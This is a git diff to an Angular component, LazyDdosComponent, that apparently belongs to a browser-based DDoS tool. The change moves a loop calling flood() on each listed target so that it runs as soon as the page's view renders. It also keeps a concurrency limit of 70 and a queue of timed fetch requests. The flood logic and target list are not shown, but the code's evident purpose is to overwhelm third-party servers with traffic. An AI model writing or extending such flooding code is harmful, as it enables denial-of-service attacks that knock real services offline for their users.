@@ -1,4 +1,4 @@
-import {Component, OnInit} from '@angular/core';
+import {AfterViewInit, Component, OnInit} from '@angular/core';
 import {KeyValue} from "@angular/common";
 import {FormControl} from "@angular/forms";
 import {LazyDdosStats} from "./lazy-ddos.types";
@@ -8,7 +8,7 @@ import {LazyDdosStats} from "./lazy-ddos.types";
   templateUrl: './lazy-ddos.component.html',
   styleUrls: ['./lazy-ddos.component.scss']
 })
-export class LazyDdosComponent implements OnInit {
+export class LazyDdosComponent implements OnInit, AfterViewInit {
 
   concurrencylimit = CONCURRENCY_LIMIT;
   stats = printStats;
@@ -21,6 +21,10 @@ export class LazyDdosComponent implements OnInit {
   }
 
   ngOnInit(): void {
+
+  }
+
+  ngAfterViewInit() {
     targets.forEach(keyValue => {
       flood(keyValue.key, keyValue);
     });
@@ -156,8 +160,8 @@ function printStats() {
   return JSON.stringify(targets, null, 2)
 }
 
-let CONCURRENCY_LIMIT = 70;
-var queue: Promise<void>[] = [];
+let CONCURRENCY_LIMIT = 70
+var queue: Promise<void>[] = []
 
 async function fetchWithTimeout(resource: RequestInfo, options: { timeout: any; }) {
   const controller = new AbortController();
